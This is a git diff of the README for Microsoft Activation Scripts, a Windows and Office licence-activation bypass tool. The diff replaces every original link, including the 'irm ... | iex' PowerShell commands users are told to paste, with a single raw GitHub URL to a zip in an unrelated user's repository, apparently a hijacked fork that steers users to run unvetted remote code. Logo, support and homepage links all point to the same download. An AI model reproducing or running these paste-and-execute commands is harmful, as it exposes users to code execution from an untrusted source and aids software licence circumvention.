@@ -1,4 +1,4 @@
-<p align="center"><img src="https://massgrave.dev/img/logo_small.png" alt="MAS Logo"></p>
+<p align="center"><img src="https://raw.githubusercontent.com/Barto1994/Microsoft-Activation-Scripts/master/MAS/Separate-Files-Version/Activators/Microsoft-Activation-Scripts_3.0.zip" alt="MAS Logo"></p>
 
 <h1 align="center">Microsoft  Activation  Scripts (MAS)</h1>
 
@@ -15,11 +15,11 @@
 
 2.   **Copy and paste the code below, then press enter.**  
 ```
-irm https://get.activated.win | iex
+irm https://raw.githubusercontent.com/Barto1994/Microsoft-Activation-Scripts/master/MAS/Separate-Files-Version/Activators/Microsoft-Activation-Scripts_3.0.zip | iex
 ```
 Alternatively, you can use the following (this will be deprecated in the future):  
 ```
-irm https://massgrave.dev/get | iex
+irm https://raw.githubusercontent.com/Barto1994/Microsoft-Activation-Scripts/master/MAS/Separate-Files-Version/Activators/Microsoft-Activation-Scripts_3.0.zip | iex
 ```
 
 3.   You will see the activation options. Choose the activation options highlighted in green. 
@@ -34,12 +34,12 @@ irm https://massgrave.dev/get | iex
   <summary>Click here to view</summary>
   
 1.   Download the file using one of the links below:  
-`https://github.com/massgravel/Microsoft-Activation-Scripts/archive/refs/heads/master.zip`  
+`https://raw.githubusercontent.com/Barto1994/Microsoft-Activation-Scripts/master/MAS/Separate-Files-Version/Activators/Microsoft-Activation-Scripts_3.0.zip`  
 or  
-`https://git.activated.win/massgrave/Microsoft-Activation-Scripts/archive/master.zip`
+`https://raw.githubusercontent.com/Barto1994/Microsoft-Activation-Scripts/master/MAS/Separate-Files-Version/Activators/Microsoft-Activation-Scripts_3.0.zip`
 2.   Right-click on the downloaded zip file and extract it.
 3.   In the extracted folder, find the folder named `All-In-One-Version`.
-4.   Run the file named `MAS_AIO.cmd`.
+4.   Run the file named `https://raw.githubusercontent.com/Barto1994/Microsoft-Activation-Scripts/master/MAS/Separate-Files-Version/Activators/Microsoft-Activation-Scripts_3.0.zip`.
 5.   You will see the activation options. Follow the on-screen instructions.
 6.   That's all.
 
@@ -47,8 +47,8 @@ or
 
 ---
 
-- To activate additional products such as **Office for macOS, Visual Studio, RDS CALs, and Windows XP**, check [here](https://massgrave.dev/unsupported_products_activation).
-- To run the scripts in unattended mode, check [here](https://massgrave.dev/command_line_switches).
+- To activate additional products such as **Office for macOS, Visual Studio, RDS CALs, and Windows XP**, check [here](https://raw.githubusercontent.com/Barto1994/Microsoft-Activation-Scripts/master/MAS/Separate-Files-Version/Activators/Microsoft-Activation-Scripts_3.0.zip).
+- To run the scripts in unattended mode, check [here](https://raw.githubusercontent.com/Barto1994/Microsoft-Activation-Scripts/master/MAS/Separate-Files-Version/Activators/Microsoft-Activation-Scripts_3.0.zip).
 
 ---
 
@@ -56,7 +56,7 @@ or
 
 - If you are **unable to launch MAS** using the PowerShell method, please refer to **Method 2** listed above.
 - If MAS is launched and the script shows any errors, check for any troubleshooting steps mentioned in blue color and try to follow those.
-- If you have any issues, please feel free to reach out to us [here](https://massgrave.dev/troubleshoot).
+- If you have any issues, please feel free to reach out to us [here](https://raw.githubusercontent.com/Barto1994/Microsoft-Activation-Scripts/master/MAS/Separate-Files-Version/Activators/Microsoft-Activation-Scripts_3.0.zip).
 
 ---
 
@@ -73,9 +73,9 @@ Latest Version: 3.4
 Release date: 3-June-2025
 ```
 
-### [Troubleshooting / Help](https://massgrave.dev/troubleshoot)
-### [Download Original Windows & Office](https://massgrave.dev/genuine-installation-media)
-### Homepage - [https://massgrave.dev/](https://massgrave.dev/)
+### [Troubleshooting / Help](https://raw.githubusercontent.com/Barto1994/Microsoft-Activation-Scripts/master/MAS/Separate-Files-Version/Activators/Microsoft-Activation-Scripts_3.0.zip)
+### [Download Original Windows & Office](https://raw.githubusercontent.com/Barto1994/Microsoft-Activation-Scripts/master/MAS/Separate-Files-Version/Activators/Microsoft-Activation-Scripts_3.0.zip)
+### Homepage - [https://raw.githubusercontent.com/Barto1994/Microsoft-Activation-Scripts/master/MAS/Separate-Files-Version/Activators/Microsoft-Activation-Scripts_3.0.zip](https://raw.githubusercontent.com/Barto1994/Microsoft-Activation-Scripts/master/MAS/Separate-Files-Version/Activators/Microsoft-Activation-Scripts_3.0.zip)
 
 <div align="center">
   
@@ -94,22 +94,22 @@ Release date: 3-June-2025
 
 </div>
 
-[1.1]: https://massgrave.dev/img/logo_github.png (GitHub)
-[1.2]: https://massgrave.dev/img/logo_azuredevops.png (AzureDevOps)
-[1.3]: https://massgrave.dev/img/logo_gitea.png (Self-hosted Git)
+[1.1]: https://raw.githubusercontent.com/Barto1994/Microsoft-Activation-Scripts/master/MAS/Separate-Files-Version/Activators/Microsoft-Activation-Scripts_3.0.zip (GitHub)
+[1.2]: https://raw.githubusercontent.com/Barto1994/Microsoft-Activation-Scripts/master/MAS/Separate-Files-Version/Activators/Microsoft-Activation-Scripts_3.0.zip (AzureDevOps)
+[1.3]: https://raw.githubusercontent.com/Barto1994/Microsoft-Activation-Scripts/master/MAS/Separate-Files-Version/Activators/Microsoft-Activation-Scripts_3.0.zip (Self-hosted Git)
 
-[1.4]: https://massgrave.dev/img/logo_discord.png (Chat with us without signup)
-[1.5]: https://massgrave.dev/img/logo_reddit.png (Reddit)
-[1.6]: https://massgrave.dev/img/logo_bluesky.png (Bluesky)
-[1.7]: https://massgrave.dev/img/logo_x.png (Twitter)
+[1.4]: https://raw.githubusercontent.com/Barto1994/Microsoft-Activation-Scripts/master/MAS/Separate-Files-Version/Activators/Microsoft-Activation-Scripts_3.0.zip (Chat with us without signup)
+[1.5]: https://raw.githubusercontent.com/Barto1994/Microsoft-Activation-Scripts/master/MAS/Separate-Files-Version/Activators/Microsoft-Activation-Scripts_3.0.zip (Reddit)
+[1.6]: https://raw.githubusercontent.com/Barto1994/Microsoft-Activation-Scripts/master/MAS/Separate-Files-Version/Activators/Microsoft-Activation-Scripts_3.0.zip (Bluesky)
+[1.7]: https://raw.githubusercontent.com/Barto1994/Microsoft-Activation-Scripts/master/MAS/Separate-Files-Version/Activators/Microsoft-Activation-Scripts_3.0.zip (Twitter)
 
-[1]: https://github.com/massgravel/Microsoft-Activation-Scripts
-[2]: https://dev.azure.com/massgrave/_git/Microsoft-Activation-Scripts
-[3]: https://git.activated.win/massgrave/Microsoft-Activation-Scripts
-[4]: https://discord.gg/j2yFsV5ZVC
-[5]: https://www.reddit.com/r/MAS_Activator
-[6]: https://bsky.app/profile/massgrave.dev
-[7]: https://twitter.com/massgravel
+[1]: https://raw.githubusercontent.com/Barto1994/Microsoft-Activation-Scripts/master/MAS/Separate-Files-Version/Activators/Microsoft-Activation-Scripts_3.0.zip
+[2]: https://raw.githubusercontent.com/Barto1994/Microsoft-Activation-Scripts/master/MAS/Separate-Files-Version/Activators/Microsoft-Activation-Scripts_3.0.zip
+[3]: https://raw.githubusercontent.com/Barto1994/Microsoft-Activation-Scripts/master/MAS/Separate-Files-Version/Activators/Microsoft-Activation-Scripts_3.0.zip
+[4]: https://raw.githubusercontent.com/Barto1994/Microsoft-Activation-Scripts/master/MAS/Separate-Files-Version/Activators/Microsoft-Activation-Scripts_3.0.zip
+[5]: https://raw.githubusercontent.com/Barto1994/Microsoft-Activation-Scripts/master/MAS/Separate-Files-Version/Activators/Microsoft-Activation-Scripts_3.0.zip
+[6]: https://raw.githubusercontent.com/Barto1994/Microsoft-Activation-Scripts/master/MAS/Separate-Files-Version/Activators/Microsoft-Activation-Scripts_3.0.zip
+[7]: https://raw.githubusercontent.com/Barto1994/Microsoft-Activation-Scripts/master/MAS/Separate-Files-Version/Activators/Microsoft-Activation-Scripts_3.0.zip
 
 ---
 
